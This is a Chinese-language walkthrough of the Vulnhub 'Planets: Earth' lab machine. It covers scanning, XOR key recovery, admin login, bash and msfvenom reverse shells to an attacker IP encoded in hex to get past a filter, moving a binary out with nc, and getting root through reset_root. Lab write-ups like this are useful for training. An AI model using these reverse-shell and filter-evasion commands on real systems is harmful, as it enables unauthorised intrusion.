---
layout: post
title: The PLANETS:EARTH
subtitle: The PLANETS:EARTH
date: 2022-12-13 17:29
author: Kyon-H
header-img: img/post-bg-2015.jpg
tags:
  - Vulnhub
  - 靶场实战
---
## The PLANETS:EARTH

kali攻击机ip：192.168.30.130

靶机ip：192.168.30.136

注：靶机若为仅主机模式，后面无法反弹shell

### 1. 网络扫描

```shell
arp-scan -l
```

![image-20221213172923933.png](https://kyonk.v6.army:1443/K7zhSS.png)

```shell
nmap -A 192.168.30.136
```

![image-20221212162322876.png](https://kyonk.v6.army:1443/qwsEbu.png)

DNS:earth.local, DNS:terratest.earth.local

发现443端口有DNS解析，在hosts文件中添加DNS解析

![image-20221213173028858.png](https://kyonk.v6.army:1443/0wm6k5.png)

### 2. 扫描目录

```shell
dirb https://earth.local
dirb https://terratest.earth.local
```

![image-20221212163628334.png](https://kyonk.v6.army:1443/LzpM2D.png)

### 3. 访问网址

https://earth.local/ 有三行信息：

```
37090b59030f11060b0a1b4e0000000000004312170a1b0b0e4107174f1a0b044e0a000202134e0a161d17040359061d43370f15030b10414e340e1c0a0f0b0b061d430e0059220f11124059261ae281ba124e14001c06411a110e00435542495f5e430a0715000306150b0b1c4e4b5242495f5e430c07150a1d4a410216010943e281b54e1c0101160606591b0143121a0b0a1a00094e1f1d010e412d180307050e1c17060f43150159210b144137161d054d41270d4f0710410010010b431507140a1d43001d5903010d064e18010a4307010c1d4e1708031c1c4e02124e1d0a0b13410f0a4f2b02131a11e281b61d43261c18010a43220f1716010d40
#
3714171e0b0a550a1859101d064b160a191a4b0908140d0e0d441c0d4b1611074318160814114b0a1d06170e1444010b0a0d441c104b150106104b1d011b100e59101d0205591314170e0b4a552a1f59071a16071d44130f041810550a05590555010a0d0c011609590d13430a171d170c0f0044160c1e150055011e100811430a59061417030d1117430910035506051611120b45
#
2402111b1a0705070a41000a431a000a0e0a0f04104601164d050f070c0f15540d1018000000000c0c06410f0901420e105c0d074d04181a01041c170d4f4c2c0c13000d430e0e1c0a0006410b420d074d55404645031b18040a03074d181104111b410f000a4c41335d1c1d040f4e070d04521201111f1d4d031d090f010e00471c07001647481a0b412b1217151a531b4304001e151b171a4441020e030741054418100c130b1745081c541c0b0949020211040d1b410f090142030153091b4d150153040714110b174c2c0c13000d441b410f13080d12145c0d0708410f1d014101011a050d0a084d540906090507090242150b141c1d08411e010a0d1b120d110d1d040e1a450c0e410f090407130b5601164d00001749411e151c061e454d0011170c0a080d470a1006055a010600124053360e1f1148040906010e130c00090d4e02130b05015a0b104d0800170c0213000d104c1d050000450f01070b47080318445c090308410f010c12171a48021f49080006091a48001d47514c50445601190108011d451817151a104c080a0e5a
```

**分析：**此为加密信息，明文为“message”框中输入信息，加密密钥为“message key”框中输入信息。



https://earth.local/admin/ 页面点击“login”跳转到登陆界面
**分析：**页面设置token防爆破处理，使用sqlmap简单测试未发现sql注入。

https://terratest.earth.local/robots.txt 页面：

![image-20221212164447680.png](https://kyonk.v6.army:1443/ZZudtb.png)

**分析：**最后一行只有文件名，无后缀。进行测试。

发现"testignotes.txt"

```
Testing secure messaging system notes:
*Using XOR encryption as the algorithm, should be safe as used in RSA.
*Earth has confirmed they have received our sent messages.
*testdata.txt was used to test encryption.
*terra used as username for admin portal.
Todo:
*How do we send our monthly keys to Earth securely? Or should we change keys weekly?
*Need to test different key lengths to protect against bruteforce. How long should the key be?
*Need to improve the interface of the messaging interface and the admin panel, it's currently very basic.
```

信息：

```
使用XOR加密
testdata.txt
username:terra
```

访问 https://terratest.earth.local/testdata.txt

```
According to radiometric dating estimation and other evidence, Earth formed over 4.5 billion years ago. Within the first billion years of Earth's history, life appeared in the oceans and began to affect Earth's atmosphere and surface, leading to the proliferation of anaerobic and, later, aerobic organisms. Some geological evidence indicates that life may have arisen as early as 4.1 billion years ago.
```

**分析：**此处明文，对应3个密文中的一个。因为三个密文长度不一，明文大约403字符，第三个密文为806个字符。

### 4. XOR加密算法

介绍：**简单异或密码**（英语：simple XOR cipher）是[密码学](https://zh.m.wikipedia.org/wiki/密码学)中一种简单的[加密算法](https://zh.m.wikipedia.org/wiki/加密算法)。文本序列的每个字符可以通过与给定的密钥进行按位异或运算来加密。如果要解密，只需要将加密后的结果与密钥再次进行按位异或运算即可。在这些密码的任何部分中，密钥运算符在[已知明文攻击](https://zh.m.wikipedia.org/wiki/已知明文攻击)下都是脆弱的，这是因为*明文* XOR *密文* = *密钥*。

python实现获取密钥：

```python
# earth 密钥解密
def getsecretkey(data1):
	result=""
	f = binascii.b2a_hex(open('testdata.txt', 'rb').read()).decode()
	result=hex(int(data1,16)^int(f,16))
	print(result)
data1="密文"
```

`int(data1,16)`将字符串作为16进制转为整数

`binascii.b2a_hex()`将二进制数据转换为十六进制字符串表示

`hex()`将10进制整数转为16进制

对第三个密文进行解密，获取16进制数，转为字符串获取密钥：

```
earthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimatechangebad4humansearthclimat
```

密钥为：`earthclimatechangebad4humans`

在登录界面输入username=terra,password=earthclimatechangebad4humans

成功登录，发现一个输入命令窗口。

### 5. 获取userflag

在命令窗口尝试各种命令。

```shell
uname
# Linux
cat /etc/passwd
# earth:x:1000:1000::/home/earth:/bin/bash
find / -user root -perm -4000 2>/dev/null
# chage gpasswd newgrp su mount umount pkexec passwd chfn chsh at sudo reset_root grub2-set-bootflag pam_timestamp_check unix_chkpwd mount.nfs /polkit-1/polkit-agent-helper-1 
find / -name "flag*"
```

发现：/var/earth_web/user_flag.txt

![image-20221212173800473.png](https://kyonk.v6.army:1443/fIPnMB.png)

**user_flag_3353b67d6437f07ba7d34afd7d2fc27d**

### 6. 反弹shell

```shell
# 攻击机
nc -lvvp 4444
# 目标机
bash -i >& /dev/tcp/192.168.30.130/4444 0>&1
```

命令被拦截，用ping尝试各种编码

```shell
ping c0.a8.1e.82 -c 4 # 无效
ping 0xC0.0xA8.0x1E.0x82 -c 4 #有效
```

![image-20221213171621009.png](https://kyonk.v6.army:1443/uWBqnb.png)

反弹shell

```shell
# 攻击机
nc -lvvp 4444
# 目标机
bash -i >& /dev/tcp/0xC0.0xA8.0x1E.0x82/4444 0>&1
```

![image-20221213171742390.png](https://kyonk.v6.army:1443/VzwhKX.png)

### 7. 提权

```shell
find / -perm -4000 2>/dev/null
# chage gpasswd newgrp su mount umount pkexec passwd chfn chsh at sudo reset_root grub2-set-bootflag pam_timestamp_check unix_chkpwd mount.nfs /polkit-1/polkit-agent-helper-1 
```

利用result_root提权

```shell
bash-5.1$ whoami
whoami
apache
bash-5.1$ /usr/bin/reset_root
/usr/bin/reset_root
CHECKING IF RESET TRIGGERS PRESENT...
RESET FAILED, ALL TRIGGERS ARE NOT PRESENT.
```

使用nc传送到本地调试一下

```shell
kali：nc -nlvp 1234 >reset_root
earth：nc -w 3 192.168.30.130 1234 < /usr/bin/reset_root
```

![image-20221213184633800.png](https://kyonk.v6.army:1443/CreORq.png)

使用strace调试

```shell
strace /home/kali/reset_root
```

![image-20221213185021050.png](https://kyonk.v6.army:1443/7wBUBS.png)

因为没有这三个文件而报错，尝试手动创建，使用touch

![image-20221213185318191.png](https://kyonk.v6.army:1443/ktQKnU.png)

![image-20221213185353158.png](https://kyonk.v6.army:1443/l4vPyi.png)

### 8. 获取rootflag

尝试使用密码Earth登录root账户成功

```shell
find / -name "root_flag*"
/root/root_flag.txt
cat /root/root_flag.txt
[root_flag_b0da9554d29db2117b02aa8b66ec492e]
```

**root_flag_b0da9554d29db2117b02aa8b66ec492e**

###  9. 其他

使用msf反弹shell

```shell
# linux
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.30.130 LPORT=4444 -f elf > shell.elf
# bash
msfvenom -p cmd/unix/reverse_bash LHOST=192.168.30.130 LPORT=4444 -f raw > shell.sh
```

创建shell.sh木马

```shell
bash -c '0<&22-;exec 22<>/dev/tcp/192.168.30.130/4444;sh <&22 >&22 2>&22'
# 修改为
bash -c '0<&22-;exec 22<>/dev/tcp/0xC0.0xA8.0x1E.0x82/4444;sh <&22 >&22 2>&22'
```

```shell
msfconsole
msf6> use exploit/multi/handler
set payload cmd/unix/reverse_bash
set lhost 192.168.30.130
set lport 4444
exploit
```

![image-20221213193300205.png](https://kyonk.v6.army:1443/9SwHUM.png)
